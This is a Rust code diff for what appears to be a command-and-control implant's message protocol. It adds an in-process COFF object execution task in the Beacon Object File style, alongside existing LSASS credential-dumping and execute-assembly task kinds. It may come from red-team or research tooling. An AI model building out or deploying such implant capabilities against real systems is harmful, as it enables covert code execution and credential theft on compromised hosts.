@@ -43,6 +43,8 @@ pub mod task_kind {
     pub const COLLECT: u8 = 0x0D;
     /// Credential access: LSASS dump variants (ABR-T032/T033).
     pub const CRED: u8 = 0x0E;
+    /// In-process COFF object execution (ABR-T034).
+    pub const EXECBOF: u8 = 0x0F;
 }
 
 /// Sub-actions of the CRED task kind (ABR-T032/T033).
@@ -233,6 +235,13 @@ pub enum TaskBody {
     Cred {
         action: u8,
         arg: String,
+    },
+    /// In-process COFF object execution (ABR-T034, BOF convention):
+    /// `data` is the x64 .obj, `args` the pre-packed Beacon argument
+    /// buffer ([u32 total][i32 type][payload]*).
+    ExecBof {
+        data: Vec<u8>,
+        args: Vec<u8>,
     },
     Exit,
 }
@@ -451,6 +460,11 @@ impl Message {
                         put_u8(&mut buf, *action);
                         put_str(&mut buf, arg);
                     }
+                    TaskBody::ExecBof { data, args } => {
+                        put_u8(&mut buf, task_kind::EXECBOF);
+                        put_blob(&mut buf, data);
+                        put_blob(&mut buf, args);
+                    }
                     TaskBody::ExecuteAssembly {
                         data,
                         type_name,
@@ -562,6 +576,10 @@ impl Message {
                     task_kind::CRED => TaskBody::Cred {
                         action: r.u8()?,
                         arg: r.string()?,
+                    },
+                    task_kind::EXECBOF => TaskBody::ExecBof {
+                        data: r.blob()?,
+                        args: r.blob()?,
                     },
                     task_kind::EXECASM => TaskBody::ExecuteAssembly {
                         data: r.blob()?,
@@ -744,6 +762,13 @@ mod tests {
             body: TaskBody::Cred {
                 action: cred_action::LSASS_USER,
                 arg: String::new(),
+            },
+        }));
+        roundtrip(Message::Task(Task {
+            id: 15,
+            body: TaskBody::ExecBof {
+                data: vec![0x64, 0x86],
+                args: vec![8, 0, 0, 0, 0, 0, 0, 0],
             },
         }));
         roundtrip(Message::TaskResult(TaskResult {
